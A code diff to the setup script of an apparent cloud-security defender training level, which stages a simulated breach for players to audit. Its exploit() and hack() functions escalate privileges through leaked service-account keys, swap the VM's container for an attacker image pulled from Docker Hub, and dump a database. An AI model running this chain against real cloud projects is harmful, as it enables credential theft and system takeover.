@@ -7,14 +7,17 @@ import csv
 import sqlalchemy
 import string
 import google.auth
+import requests
+import shutil
 
 from googleapiclient import discovery
 from sqlalchemy.sql import text
-from google.oauth2 import service_account
+from google.oauth2 import service_account, id_token
 from core.framework import levels
 from google.cloud import (
     storage,
-    secretmanager
+    secretmanager,
+    logging as glogging
 )
 from core.framework.cloudhelpers import (
     deployments,
@@ -22,6 +25,8 @@ from core.framework.cloudhelpers import (
     gcstorage,
     cloudfunctions
 )
+import google.auth.transport.requests
+from google.auth.transport.requests import AuthorizedSession
 
 LEVEL_PATH = 'defender/audit'
 FUNCTION_LOCATION = 'us-central1'
@@ -30,6 +35,7 @@ DB_SECRET_ID = 'defender_db_password'
 def create(second_deploy=True):
     print("Level initialization started for: " + LEVEL_PATH)
     nonce = str(random.randint(100000000000, 999999999999))
+    credentials, project_id = google.auth.default()
 
     #the cloud function may need to know information about the vm in order to hit our API. put that info here.
     func_template_args = {}
@@ -75,21 +81,34 @@ def create(second_deploy=True):
     print("Level setup started for: " + LEVEL_PATH)
     create_tables(db_secret_value)
     dev_key = iam.generate_service_account_key('dev-account')
+    dev_sa = service_account.Credentials.from_service_account_info(json.loads(dev_key))
+    compute_admin_key = iam.generate_service_account_key('compute-admin')
     logging_key = iam.generate_service_account_key('log-viewer')
+    # add vm files to bucket
     storage_client = storage.Client()
     vm_image_bucket = storage_client.get_bucket(f'vm-image-bucket-{nonce}')
-    storage_blob = storage.Blob('main.py', vm_image_bucket)
-    storage_blob.upload_from_filename(f'core/levels/{LEVEL_PATH}/resources/api-engine/main.py')
-    storage_blob = storage.Blob('Dockerfile', vm_image_bucket)
-    storage_blob.upload_from_filename(f'core/levels/{LEVEL_PATH}/resources/api-engine/Dockerfile')
-    storage_blob = storage.Blob('requirements.txt', vm_image_bucket)
-    storage_blob.upload_from_filename(f'core/levels/{LEVEL_PATH}/resources/api-engine/requirements.txt')
-    storage_blob = storage.Blob('cloud_sql_proxy', vm_image_bucket)
-    storage_blob.upload_from_filename(f'core/levels/{LEVEL_PATH}/resources/api-engine/cloud_sql_proxy')
+    gcstorage.upload_directory_recursive(f'core/levels/{LEVEL_PATH}/resources/api-engine', f'vm-image-bucket-{nonce}')
 
+    storage_blob = storage.Blob('compute-admin.json', vm_image_bucket)
+    storage_blob.upload_from_string(compute_admin_key)
+    
+    #os.environ['GOOGLE_APPLICATION_CREDENTIALS'] = 'start/dev-account.json'
+    url = "http://us-central1-" + project_id + ".cloudfunctions.net/rm-user-" + nonce
+
+    req = google.auth.transport.requests.Request()
+    id_token = google.oauth2.id_token.fetch_id_token(req, url)
+    headers = {'Authorization': f"Bearer {id_token}"}
+    data = {'name':'Robert Caldwell', 'authentication':dev_key}
+    resp = req(url, method = 'POST', body = data, headers = headers)
+
+    time.sleep(5)
+    hostname = exploit(nonce, logging_key)
+    time.sleep(5)
+    hack(hostname)
 
     print(f'Level creation complete for: {LEVEL_PATH}')
     start_message = ('Helpful start message')
+    levels.write_start_info(LEVEL_PATH, start_message, file_name="dev-account.json", file_content=dev_key)
 
 
 def create_secret(secret_id, secret_value):
@@ -182,6 +201,67 @@ def create_tables(db_password):
     proxy.terminate()
 
 
+def exploit(nonce, logging_key):
+    credentials, project_id = google.auth.default()
+    logging_client = glogging.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(logging_key)))
+    logger = logging_client.logger('rmUser')
+    logs = logger.list_entries()
+    # TODO fix sleep could crash if log is delayed
+    dev_key = list(logs)[-1].payload['auth']
+    print(dev_key)
+    storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
+    blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
+    temp_dir = 'test/' ###TODO change me
+    os.mkdir(temp_dir)
+    for blob in blobs:
+        blob.download_to_filename(f'{temp_dir}{blob.name}')
+
+    with open(f'{temp_dir}compute-admin.json') as keyfile:    
+        compute_admin_key = json.loads(keyfile.read())
+    
+    compute_api = discovery.build('compute', 'v1', credentials=service_account.Credentials.from_service_account_info(compute_admin_key))
+    api_instance = compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()
+    new_gce = '''
+    metadata:
+      name: a6
+    spec:
+      containers:
+      - image: docker.io/aujxn/defender-audit-compromised:latest
+        imagePullPolicy: Always
+        name: a6
+        ports:
+        - containerPort: 80
+          hostPort: 80
+        volumeMounts: []
+      volumes: []
+
+  '''
+    fingerprint = api_instance['metadata']['fingerprint']
+    payload = {'fingerprint': fingerprint, 'items': [{'key': 'gce-container-declaration', 'value': new_gce}]}
+    compute_api.instances().setMetadata(project=project_id, zone='us-west1-b', instance='api-engine', body=payload).execute()
+    compute_api.instances().stop(project=project_id, zone='us-west1-b', instance='api-engine').execute()
+    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'TERMINATED'):
+        time.sleep(2)
+    compute_api.instances().start(project=project_id, zone='us-west1-b', instance='api-engine').execute()
+    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'RUNNING'):
+        time.sleep(2)
+    shutil.rmtree(temp_dir)
+
+    #returns External IP of the restarted vm
+    #time.sleep(60)
+    return compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['networkInterfaces'][0]['accessConfigs'][0]['natIP']
+
+
+def hack(hostname):
+    url = f'http://{hostname}/hacked'
+
+    payload = {'sql': 'select * from devs;'}
+    response = requests.post(url, data=payload)
+    while(response.status_code != 200):
+        time.sleep(10)
+        response = requests.post(url, data=payload)
+    print(response.text)
+
 def delete_secret(secret_id):
     _, project_id = google.auth.default()
 
@@ -196,5 +276,6 @@ def delete_secret(secret_id):
 
 
 def destroy():
+    levels.delete_start_files()
     deployments.delete()
     delete_secret(DB_SECRET_ID)
